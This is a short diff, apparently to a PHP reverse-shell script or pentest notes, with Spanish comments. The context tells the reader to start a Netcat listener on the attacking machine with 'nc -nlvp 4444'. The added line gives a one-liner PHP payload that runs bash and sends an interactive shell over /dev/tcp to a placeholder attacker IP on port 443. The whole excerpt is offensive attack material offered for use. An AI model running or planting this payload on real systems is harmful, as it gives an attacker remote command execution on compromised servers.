@@ -4,6 +4,8 @@
 
 // > Recordar que en la maquina atacante se debe levantar una sesion por Netcat con el comando "nc -nlvp 4444"
 
+// Un comando Oneliner para ganar reverse shell efectivo es: <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?> 
+
 -------------------------------------------------------------
 <?php
 
